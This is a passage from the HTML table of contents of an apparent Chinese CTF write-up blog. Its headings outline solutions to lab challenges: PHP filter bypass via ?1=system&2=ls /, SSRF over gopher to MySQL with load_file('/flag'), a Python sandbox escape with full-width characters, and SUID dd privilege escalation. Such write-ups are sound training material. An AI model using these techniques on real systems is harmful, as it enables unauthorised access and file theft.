href="#%E7%84%B6%E5%90%8E%E5%B0%B1%E6%98%AF%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E9%83%A8%E5%88%86%EF%BC%8C%E8%BF%87%E6%BB%A4%E4%BA%86%E5%BE%88%E5%A4%9A%EF%BC%8C%E8%BF%99%E9%87%8C%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E7%9A%84%E6%96%B9%E5%BC%8F%E8%BF%98%E6%98%AF%E6%8C%BA%E5%A4%9A%E7%9A%84%EF%BC%8C%E6%AF%94%E5%A6%82%E5%88%A9%E7%94%A8base64-decode-%E7%BB%95%E8%BF%87%EF%BC%8C%E5%88%A9%E7%94%A8%E5%A4%9A%E6%AC%A1%E4%BC%A0%E5%8F%82task-GET-1-GET-2-%E7%84%B6%E5%90%8Eget%E4%BC%A0%E5%8F%82-1-system-2-ls-%E7%AD%89%E7%AD%89%EF%BC%8C%E8%BF%99%E9%87%8C%E5%B0%B1%E7%94%A8%E5%A4%9A%E6%AC%A1%E4%BC%A0%E5%8F%82%E5%A5%BD%E4%BA%86%E3%80%82"><span class="toc-number">16.0.3.</span> <span class="toc-text">然后就是代码执行部分，过滤了很多，这里可以绕过的方式还是挺多的，比如利用base64_decode()绕过，利用多次传参task&#x3D;$_GET[1]($_GET[2]);然后get传参?1&#x3D;system$2&#x3D;ls &#x2F;等等，这里就用多次传参好了。</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EasySignin"><span class="toc-number">17.</span> <span class="toc-text">EasySignin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%BC%80%E7%8E%AF%E5%A2%83%E6%98%AF%E4%B8%AA%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%EF%BC%8C%E4%B8%8B%E9%9D%A2%E8%BF%98%E6%9C%89%E4%B8%AA%E6%B3%A8%E5%86%8C%E8%B7%B3%E8%BD%AC%EF%BC%8C%E5%85%88%E5%8E%BB%E6%B3%A8%E5%86%8C%E4%B8%80%E4%B8%8B%EF%BC%8C%E7%84%B6%E5%90%8E%E5%8F%91%E7%8E%B0admin%E7%94%A8%E6%88%B7%E5%90%8D%E8%A2%AB%E5%8D%A0%E7%94%A8%EF%BC%8C%E4%BA%8E%E6%98%AF%E6%B3%A8%E5%86%8C%E4%BA%86%E4%B8%AAadmin1%EF%BC%8C%E7%84%B6%E5%90%8E%E7%99%BB%E5%BD%95%E3%80%82"><span class="toc-number">17.0.1.</span> <span class="toc-text">打开环境是个登录页面，下面还有个注册跳转，先去注册一下，然后发现admin用户名被占用，于是注册了个admin1，然后登录。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%9B%BE%E7%89%87%EF%BC%8C%E4%BD%86%E6%98%AF%E7%82%B9%E8%BF%9B%E5%8E%BB%E5%8F%91%E7%8E%B0%E8%A2%AB%E9%99%90%E5%88%B6%E4%B8%8D%E8%AE%A9%E7%9C%8B%EF%BC%8C%E8%81%94%E7%B3%BB%E5%89%8D%E9%9D%A2%E7%9A%84admin%E7%94%A8%E6%88%B7%E5%90%8D%E8%A2%AB%E5%8D%A0%E7%94%A8%EF%BC%8C%E5%88%A4%E6%96%AD%E5%8F%AF%E8%83%BD%E8%A6%81%E8%B6%8A%E6%9D%83%E7%99%BB%E5%BD%95admin%E8%B4%A6%E5%8F%B7%E6%89%8D%E8%83%BD%E7%9C%8B%EF%BC%8C%E5%88%9A%E5%A5%BD%E6%97%81%E8%BE%B9%E8%BF%98%E6%9C%89%E4%B8%AA%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81%EF%BC%8C%E5%8E%BB%E6%8A%93%E5%8C%85%E8%AF%A5%E9%A1%B5%E9%9D%A2%E7%9A%84%E8%AF%B7%E6%B1%82%EF%BC%8C%E6%9E%9C%E7%84%B6%E4%BC%A0%E5%85%A5%E7%9A%84%E5%8F%82%E6%95%B0%E6%9C%89%E7%94%A8%E6%88%B7%E5%90%8D%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%B0%B1%E7%AE%80%E5%8D%95%E4%BA%86%EF%BC%8C%E7%9B%B4%E6%8E%A5%E6%8A%8A%E7%94%A8%E6%88%B7%E5%90%8Dadmin1%E6%94%B9%E6%88%90admin%E5%B0%B1%E8%83%BD%E4%BF%AE%E6%94%B9admin%E7%9A%84%E5%AF%86%E7%A0%81%EF%BC%8C%E8%BF%9B%E8%80%8C%E7%99%BB%E5%BD%95%E5%85%B6%E8%B4%A6%E5%8F%B7%E4%BA%86%E3%80%82"><span class="toc-number">17.0.2.</span> <span class="toc-text">登录后可以看图片，但是点进去发现被限制不让看，联系前面的admin用户名被占用，判断可能要越权登录admin账号才能看，刚好旁边还有个修改密码，去抓包该页面的请求，果然传入的参数有用户名，这样就简单了，直接把用户名admin1改成admin就能修改admin的密码，进而登录其账号了。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E5%90%8E%E5%8E%BB%E7%9C%8B%E5%9B%BE%E7%89%87%E6%9E%9C%E7%84%B6%E5%B0%B1%E5%8F%AF%E4%BB%A5%E4%BA%86%EF%BC%8C%E7%84%B6%E5%90%8E%E5%B0%B1%E8%A2%AB%E5%9B%BE%E5%90%B8%E5%BC%95%E4%BA%86%EF%BC%8C%E6%83%B3%E7%9D%80%E5%8F%AF%E8%83%BD%E5%9B%BE%E7%89%87%E9%87%8C%E9%9D%A2%E8%97%8F%E7%9D%80flag%EF%BC%8C%E7%84%B6%E5%90%8E%E5%B0%B1%E5%92%8Cflag%E6%B8%90%E8%A1%8C%E6%B8%90%E8%BF%9C%E4%BA%86"><span class="toc-number">17.0.3.</span> <span class="toc-text">登录后去看图片果然就可以了，然后就被图吸引了，想着可能图片里面藏着flag，然后就和flag渐行渐远了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E4%B8%80%E6%AE%B5%E6%97%B6%E9%97%B4%E5%90%8E%E7%8E%AF%E5%A2%83%E5%85%B3%E4%BA%86%E9%87%8D%E6%96%B0%E5%BC%84%E4%BA%86%E4%B8%80%E9%81%8D%E6%89%8D%E5%8F%91%E7%8E%B0%E5%9B%BE%E7%89%87%E8%BF%98%E6%98%AF%E9%9A%8F%E6%9C%BA%E7%9A%84%EF%BC%8C%E7%88%BD%E7%9C%8B%E5%9B%BE%E7%89%87%E5%96%B5"><span class="toc-number">17.0.4.</span> <span class="toc-text">然后一段时间后环境关了重新弄了一遍才发现图片还是随机的，爽看图片喵</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E6%B3%A8%E6%84%8F%E5%88%B0url%E4%B8%ADget%E4%BA%86%E4%B8%80%E4%B8%AAurl%E7%9A%84%E5%8F%82%E6%95%B0%E4%BD%9C%E4%B8%BA%E5%9B%9E%E6%98%BE%E5%9B%BE%E7%89%87%E7%9A%84%E7%BD%91%E5%9D%80%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9%E8%BF%99%E4%B8%AAurl%E5%8F%82%E6%95%B0%E6%9D%A5%E5%81%9A%E5%88%B0ssrf%EF%BC%8C%E4%BD%86%E6%98%AF%E5%B0%9D%E8%AF%95%E5%A4%9A%E6%AC%A1%E7%9B%B4%E6%8E%A5%E5%88%A9%E7%94%A8file%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E9%83%BD%E5%9C%A8%E6%BA%90%E4%BB%A3%E7%A0%81base64%E5%9B%9E%E6%98%BEbm9ub25v-nonono-%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E4%BB%A3%E8%A1%A8%E5%8F%AF%E8%83%BD%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="toc-number">17.0.5.</span> <span class="toc-text">这里注意到url中get了一个url的参数作为回显图片的网址，所以我们可以通过修改这个url参数来做到ssrf，但是尝试多次直接利用file伪协议读取都在源代码base64回显bm9ub25v(nonono)，也就是代表可能被过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E5%8F%AF%E4%BB%A5%E7%94%A8gopher-127-0-0-1-%E7%AB%AF%E5%8F%A3%E6%9D%A5%E5%88%A4%E6%96%AD%E9%82%A3%E4%B8%80%E4%B8%AA%E8%83%BD%E6%94%BB%E5%87%BB"><span class="toc-number">17.0.6.</span> <span class="toc-text">这里可以用gopher:&#x2F;&#x2F;127.0.0.1:端口来判断那一个能攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E5%88%A4%E6%96%AD%E5%87%BAMySQL%E6%98%AF%E6%9C%89%E5%9B%9E%E6%98%BE%E7%9A%84%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%94%A8gopherus%E5%86%99%E5%85%A5MySQL%E5%91%BD%E4%BB%A4show-database-%E5%92%8Cselect-load-file-flag-%E4%BA%86%EF%BC%8C%E8%BF%99%E9%87%8C%E4%BD%BF%E7%94%A8%E9%BB%98%E8%AE%A4MySQL%E7%94%A8%E6%88%B7%E5%90%8Droot%EF%BC%8C%E7%84%B6%E5%90%8Eurl%E7%BC%96%E7%A0%81%E4%B8%80%E6%AC%A1%E5%8D%B3%E5%8F%AF%E3%80%82"><span class="toc-number">17.0.7.</span> <span class="toc-text">然后判断出MySQL是有回显的，这样就可以用gopherus写入MySQL命令show database;和select load_file(&#39;&#x2F;flag&#39;);了，这里使用默认MySQL用户名root，然后url编码一次即可。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86%E5%9B%9E%E6%98%BEbase64%E8%A7%A3%E7%A0%81%E5%BE%97%E5%88%B0flag"><span class="toc-number">17.0.8.</span> <span class="toc-text">将回显base64解码得到flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pyblockly"><span class="toc-number">18.</span> <span class="toc-text">pyblockly</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%9D%E7%84%B6%E6%B2%A1%E6%9C%89%E7%8E%AF%E5%A2%83%EF%BC%8Cflask%E6%A1%86%E6%9E%B6%E5%90%AF%E5%8A%A8%E4%B8%80%E4%B8%8B%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%B2%A1%E6%9C%89index-html%EF%BC%8Cindex-html%E9%87%8C%E9%9D%A2%E6%9C%AC%E6%9D%A5%E6%98%AF%E8%83%BD%E5%8F%91%E5%87%BApost%E8%AF%B7%E6%B1%82%E7%9A%84%EF%BC%8C%E7%84%B6%E5%90%8E%E6%88%91%E4%BB%AC%E5%B0%B1%E8%83%BD%E9%80%9A%E8%BF%87%E5%8F%91%E5%87%BA%E7%9A%84post%E8%BF%9B%E8%A1%8C%E4%B8%80%E4%B8%8B%E4%BF%AE%E6%94%B9%E6%9D%A5py%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-number">18.0.1.</span> <span class="toc-text">依然没有环境，flask框架启动一下，发现没有index.html，index.html里面本来是能发出post请求的，然后我们就能通过发出的post进行一下修改来py沙箱逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%98%E6%98%AF%E5%85%88%E5%AE%A1%E8%AE%A1%E4%B8%80%E4%B8%8B%E4%BB%A3%E7%A0%81%E5%90%A7%EF%BC%8C%E4%B8%BB%E5%87%BD%E6%95%B0%E5%A4%84%E7%90%86post%E8%AF%B7%E6%B1%82-json-to-python-block-to-python-check-for-blacklisted-symbols-do-python-code-verify-secure"><span class="toc-number">18.0.2.</span> <span class="toc-text">还是先审计一下代码吧，主函数处理post请求(json_to_python-&gt;block_to_python-&gt;check_for_blacklisted_symbols)-&gt;do(python_code)-&gt;verify_secure</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E7%82%B9%E5%9C%A8do%E5%87%BD%E6%95%B0%E9%87%8C%E9%9D%A2%EF%BC%8C%E4%BB%96%E4%BC%9A%E5%86%99%E5%85%A5run-py%E5%B9%B6%E8%BF%90%E8%A1%8C%EF%BC%8C%E8%BF%99%E5%B0%B1%E7%BB%99%E4%BA%86%E6%88%91%E4%BB%AC%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%9A%84%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%BD%86%E6%98%AF%E9%98%BB%E7%A2%8D%E4%B9%9F%E5%BE%88%E5%A4%9A%EF%BC%8C%E6%88%91%E4%BB%AC%E6%9D%A5%E4%B8%80%E4%B8%80%E6%94%BB%E7%A0%B4"><span class="toc-number">18.0.3.</span> <span class="toc-text">重点在do函数里面，他会写入run.py并运行，这就给了我们任意代码执行的漏洞，但是阻碍也很多，我们来一一攻破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E6%98%AFcheck-for-blacklisted-symbols-%E4%BB%96%E4%BC%9A%E6%A3%80%E6%B5%8B%E6%98%AF%E5%90%A6%E6%9C%89blacklist-pattern%E9%87%8C%E9%9D%A2%E7%9A%84%E7%AC%A6%E5%8F%B7%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%9C%89%EF%BC%8C%E5%88%99%E6%97%A0%E6%B3%95%E5%86%99%E5%85%A5text%E6%A8%A1%E5%9D%97%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E9%99%90%E5%88%B6%E6%88%91%E4%BB%AC%E4%B8%8D%E8%83%BD%E6%9C%89blacklist-pattern%E9%87%8C%E9%9D%A2%E7%9A%84%E7%AC%A6%E5%8F%B7%EF%BC%8C%E4%BD%86%E6%98%AF%E5%A6%82%E6%9E%9C%E6%B2%A1%E6%9C%89%EF%BC%8C%E4%BB%96%E4%BC%9A%E6%89%A7%E8%A1%8Cunidecode%E5%87%BD%E6%95%B0"><span class="toc-number">18.0.4.</span> <span class="toc-text">首先是check_for_blacklisted_symbols,他会检测是否有blacklist_pattern里面的符号，如果有，则无法写入text模块，也就是限制我们不能有blacklist_pattern里面的符号，但是如果没有，他会执行unidecode函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E8%BF%99%E4%B8%80%E7%82%B9%E5%B0%86%E6%88%91%E4%BB%AC%E6%83%B3%E8%A6%81%E7%94%A8%E5%88%B0%E7%9A%84%E7%AC%A6%E5%8F%B7%E8%BD%AC%E6%8D%A2%E4%B8%BA%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%EF%BC%8C%E4%B8%94%E4%BF%9D%E8%AF%81unidecode%E5%87%BD%E6%95%B0%E8%83%BD%E5%B0%86%E5%85%B6%E5%8F%98%E5%9B%9E%E6%9D%A5%EF%BC%8C%E8%BF%99%E9%87%8C%E5%81%B7%E6%87%92%E4%B8%8D%E6%83%B3%E4%B8%80%E4%B8%AA%E4%B8%AA%E8%AF%95%E4%BA%86%EF%BC%8C%E5%BA%94%E8%AF%A5%E5%85%A8%E5%8D%8A%E8%A7%92%E8%BD%AC%E6%8D%A2%E5%8D%B3%E5%8F%AF"><span class="toc-number">18.0.5.</span> <span class="toc-text">所以我们可以利用这一点将我们想要用到的符号转换为特殊字符，且保证unidecode函数能将其变回来，这里偷懒不想一个个试了，应该全半角转换即可</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E5%B0%B1%E6%98%AFverify-secure%EF%BC%8C%E4%BB%96%E4%BC%9A%E6%A3%80%E6%B5%8B%E6%88%91%E4%BB%AC%E6%98%AF%E5%90%A6%E8%BF%9B%E8%A1%8C%E4%BA%86import%EF%BC%8C%E5%AF%B9%E6%88%91%E4%BB%AC%E7%9A%84%E4%BB%A3%E7%A0%81%E8%BF%9B%E8%A1%8C%E4%BA%86%E9%99%90%E5%88%B6%EF%BC%8C%E4%B8%8D%E5%85%81%E8%AE%B8%E6%88%91%E4%BB%AC%E5%AF%BC%E5%85%A5%E6%A8%A1%E5%9D%97"><span class="toc-number">18.0.6.</span> <span class="toc-text">然后就是verify_secure，他会检测我们是否进行了import，对我们的代码进行了限制，不允许我们导入模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E5%B0%B1%E6%98%AFhook-code%EF%BC%8C%E4%BB%96%E4%BC%9A%E5%9C%A8%E6%88%91%E4%BB%AC%E5%86%99%E5%85%A5%E7%9A%84run-py%E5%89%8D%E9%9D%A2%E5%8A%A0%E4%B8%8A%E4%B8%80%E6%AE%B5%E4%BB%A3%E7%A0%81%E8%BF%9B%E8%A1%8C%E4%BB%A3%E7%A0%81%E8%BF%90%E8%A1%8C%E6%A3%80%E6%B5%8B%EF%BC%8C%E6%97%A2ban%E6%8E%89%E4%BA%86%E6%88%91%E4%BB%AC%E5%87%A0%E4%B8%AA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%EF%BC%8C%E4%B9%9F%E9%99%90%E5%88%B6%E4%BA%8B%E4%BB%B6%E5%90%8D%E7%A7%B0%E9%95%BF%E5%BA%A6%E4%B8%8D%E8%B6%85%E8%BF%874"><span class="toc-number">18.0.7.</span> <span class="toc-text">最后就是hook_code，他会在我们写入的run.py前面加上一段代码进行代码运行检测，既ban掉了我们几个命令执行函数，也限制事件名称长度不超过4.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E5%81%B7%E4%B8%80%E4%B8%AAwp%E9%87%8C%E9%9D%A2%E7%9A%84%E8%AF%A5%E9%A2%98%E4%BC%A0%E5%8F%82%E7%9A%84json%E6%A8%A1%E7%89%88"><span class="toc-number">18.0.8.</span> <span class="toc-text">这里偷一个wp里面的该题传参的json模版</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9text%E9%83%A8%E5%88%86%E6%9D%A5%E8%BF%9B%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%8C%E4%B8%8D%E8%BF%87%E7%94%B1%E4%BA%8E%E5%8E%9F%E4%BB%A3%E7%A0%81%E6%98%AFprint-%E2%80%98TEXT%E2%80%99-%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E8%A6%81%E5%85%88%E9%97%AD%E5%90%88print%E5%91%BD%E4%BB%A4%EF%BC%8C%E5%86%8D%E6%B3%A8%E9%87%8A%E6%8E%89%E5%90%8E%E9%9D%A2%EF%BC%8C%E6%89%8D%E8%83%BD%E8%BF%9B%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%8Cpython%E9%87%8C%E9%9D%A2%E7%94%A8-n%E6%9D%A5%E6%96%AD%E5%BC%80%E5%91%BD%E4%BB%A4"><span class="toc-number">18.0.9.</span> <span class="toc-text">这里通过修改text部分来进行代码执行，不过由于原代码是print(‘TEXT’),所以我们要先闭合print命令，再注释掉后面，才能进行代码执行，python里面用\n来断开命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E9%87%8Copen%E5%91%BD%E4%BB%A4ai%E6%98%AF%E8%83%BD%E5%B8%AE%E5%8A%A9%E6%83%B3%E5%88%B0%E7%9A%84%EF%BC%8C%E4%BD%86%E6%98%AF%E5%AE%9E%E9%99%85%E7%8E%AF%E5%A2%83%E4%B8%AD%E5%9B%A0%E4%B8%BA%E6%9D%83%E9%99%90%E4%B8%8D%E8%B6%B3%EF%BC%8C%E5%8F%AA%E8%83%BD%E8%AF%BB%E5%8F%96-etc-passwd%E8%80%8C%E4%B8%8D%E8%83%BD%E8%AF%BB%E5%8F%96%E8%AF%B8%E5%A6%82flag-txt-%E6%89%80%E4%BB%A5%E8%BF%99%E9%87%8C%E8%BF%98%E8%A6%81Linux-%E6%8F%90%E6%9D%83"><span class="toc-number">18.0.10.</span> <span class="toc-text">这里open命令ai是能帮助想到的，但是实际环境中因为权限不足，只能读取&#x2F;etc&#x2F;passwd而不能读取诸如flag.txt,所以这里还要Linux 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8E%E6%98%AF%E8%80%83%E8%99%91%E7%BB%95%E8%BF%87%E9%95%BF%E5%BA%A6%E6%A3%80%E6%B5%8B%EF%BC%8C%E8%BF%99%E9%87%8C%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E9%87%8D%E5%86%99len%E5%87%BD%E6%95%B0%E7%9A%84%E6%96%B9%E5%BC%8F%EF%BC%8C%E4%BD%BF%E5%85%B6%E6%B0%B8%E8%BF%9C%E8%BF%94%E5%9B%9E3"><span class="toc-number">18.0.11.</span> <span class="toc-text">于是考虑绕过长度检测，这里可以使用重写len函数的方式，使其永远返回3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%94%E5%9B%9E3%E5%88%99%E8%AF%81%E6%98%8E%E4%BF%AE%E6%94%B9%E6%88%90%E5%8A%9F"><span class="toc-number">18.0.12.</span> <span class="toc-text">返回3则证明修改成功</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8os-system%EF%BC%8C%E6%8C%89%E7%85%A7ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E7%9A%84%E6%96%B9%E5%BC%8F%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E4%BA%86-%E5%B0%86%E4%B8%8B%E9%9D%A2%E7%9A%84%E5%91%BD%E4%BB%A4%E5%85%A8%E5%8D%8A%E8%A7%92%E8%BD%AC%E6%8D%A2%EF%BC%8C%E5%86%8D%E6%9B%BF%E6%8D%A2%E6%8E%89%E4%B8%8A%E9%9D%A2%E7%9A%84print%E5%91%BD%E4%BB%A4%E5%8D%B3%E5%8F%AF"><span class="toc-number">18.0.13.</span> <span class="toc-text">然后就可以利用os.system，按照ssti模版注入的方式执行任意命令了,将下面的命令全半角转换，再替换掉上面的print命令即可</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E5%B0%B1%E6%98%AF%E6%8F%90%E6%9D%83%E4%BA%86%EF%BC%8C%E6%8E%A2%E6%B5%8BSUID%E6%96%87%E4%BB%B6"><span class="toc-number">18.0.14.</span> <span class="toc-text">然后就是提权了，探测SUID文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E4%BC%9A%E6%89%BE%E5%88%B0dd%E8%BF%99%E4%B8%AA%E5%91%BD%E4%BB%A4"><span class="toc-number">18.0.15.</span> <span class="toc-text">这里会找到dd这个命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%80%E4%BB%A5%E8%BF%99%E9%87%8C%E5%8F%AA%E9%9C%80%E8%A6%81dd-if-flag%E5%91%BD%E4%BB%A4%E5%8D%B3%E5%8F%AF%E5%BE%97%E5%88%B0flag"><span class="toc-number">18.0.16.</span> <span class="toc-text">所以这里只需要dd if&#x3D;&#x2F;flag命令即可得到flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B2%A1%E6%9C%89%E7%8E%AF%E5%A2%83%E8%BF%98%E6%98%AF%E5%9D%90%E7%89%A2"><span class="toc-number">18.0.17.</span> <span class="toc-text">没有环境还是坐牢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%A9%E4%B8%8B%E4%B8%A4%E9%81%93%E9%83%BD%E5%8F%91%E8%BF%87%E4%BA%86"><span class="toc-number">18.0.18.</span> <span class="toc-text">剩下两道都发过了</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web1234"><span class="toc-number">19.</span> <span class="toc-text">web1234</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E6%89%93%E5%BC%80%E9%A1%B5%E9%9D%A2%E5%8F%91%E7%8E%B0%E5%87%A0%E4%B9%8E%E5%95%A5%E4%B9%9F%E6%B2%A1%E6%9C%89%EF%BC%8C%E5%85%B3%E4%BA%8E%E8%BF%99%E7%A7%8D%E5%95%A5%E4%B9%9F%E6%B2%A1%E6%9C%89%E7%9A%84%E8%82%AF%E5%AE%9A%E5%85%88dirsearch%E6%89%AB%E6%8F%8F%E4%B8%80%E4%B8%8B%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%B2%A1%E6%89%AB%E6%8F%8F%E5%88%B0%E6%9C%89%E7%94%A8%E7%9A%84%E5%B0%B1%E6%9F%A5%E7%9C%8B%E4%B8%80%E4%B8%8Brobots-txt%EF%BC%8C%E8%BF%99%E9%87%8C%E6%98%AF%E5%9C%A8robots-txt%E9%87%8C%E9%9D%A2%E7%9C%8B%E5%88%B0%E6%9C%89www-zip%E8%BF%99%E4%B8%80%E4%B8%AA%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%EF%BC%8C%E4%B8%8B%E8%BD%BD%E4%B8%8B%E6%9D%A5%E5%8F%91%E7%8E%B0%E6%98%AF%E6%BA%90%E6%96%87%E4%BB%B6%EF%BC%8C%E5%8C%85%E5%90%AB3%E4%B8%AAphp%E6%96%87%E4%BB%B6"><span class="toc-number">19.0.1.</span> <span class="toc-text">首先打开页面发现几乎啥也没有，关于这种啥也没有的肯定先dirsearch扫描一下，如果没扫描到有用的就查看一下robots.txt，这里是在robots.txt里面看到有www.zip这一个备份文件，下载下来发现是源文件，包含3个php文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E7%9C%8B%E4%B8%80%E4%B8%8Bindex-php"><span class="toc-number">19.0.2.</span> <span class="toc-text">首先看一下index.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E9%9D%A2%E7%BB%99%E5%87%BA%E4%BA%86%E6%88%91%E4%BB%AC%E7%99%BB%E5%BD%95%E7%9A%84%E8%A6%81%E6%B1%82%E6%98%AFuname%E5%92%8Cmd5-md5-GET-%E2%80%98passwd%E2%80%99-%E4%B8%8EConfig%E5%AF%B9%E5%BA%94%E7%9A%84%E7%9B%B8%E5%90%8C%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E5%8E%BB%E5%8C%85%E5%90%AB%E7%9A%84class-php%E9%87%8C%E9%9D%A2%E7%9C%8B%E7%9C%8BConfig%E5%88%B0%E5%BA%95%E6%98%AF%E4%BB%80%E4%B9%88%E3%80%82"><span class="toc-number">19.0.3.</span> <span class="toc-text">这里面给出了我们登录的要求是uname和md5(md5($_GET[‘passwd’]))与Config对应的相同，所以我们去包含的class.php里面看看Config到底是什么。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E6%9C%89%E4%B8%80%E6%AE%B5resetconf-%E8%BF%94%E5%9B%9E%E5%87%BA%E5%8E%82%E8%AE%BE%E7%BD%AE%EF%BC%8C%E6%97%A2%E7%84%B6%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%8A%8A%E5%89%8D%E7%AB%AF%E5%88%A0%E4%BA%86%EF%BC%8C%E7%94%A8%E9%BB%98%E8%AE%A4%E7%9A%84%E5%BA%94%E8%AF%A5%E5%B0%B1%E8%A1%8C%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E5%8E%BB%E5%B0%86%E9%BB%98%E8%AE%A4%E6%95%B0%E6%8D%AE%E7%9A%84base64%E8%A7%A3%E7%A0%81%E4%B8%80%E4%B8%8B%EF%BC%8C%E5%BE%97%E5%88%B0uname%E5%92%8Cmd5-md5-GET-%E2%80%98passwd%E2%80%99-%E7%9A%84%E4%BF%A1%E6%81%AF%EF%BC%8C%E7%84%B6%E5%90%8E%E5%86%8D%E7%88%86%E7%A0%B4%E4%B8%80%E4%B8%8Bpasswd%E5%B0%B1%E8%83%BD%E9%A1%BA%E5%88%A9%E7%99%BB%E5%BD%95%E4%BA%86"><span class="toc-number">19.0.4.</span> <span class="toc-text">中间有一段resetconf()&#x2F;&#x2F;返回出厂设置，既然题目说把前端删了，用默认的应该就行了，所以我们去将默认数据的base64解码一下，得到uname和md5(md5($_GET[‘passwd’]))的信息，然后再爆破一下passwd就能顺利登录了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F%E5%90%8E%E7%99%BB%E5%BD%95%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%98%AF%E4%B8%AA%E7%B1%BB%E4%BC%BC%E4%BA%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E7%95%8C%E9%9D%A2"><span class="toc-number">19.0.5.</span> <span class="toc-text">爆破成功后登录，发现是个类似于文件上传的界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 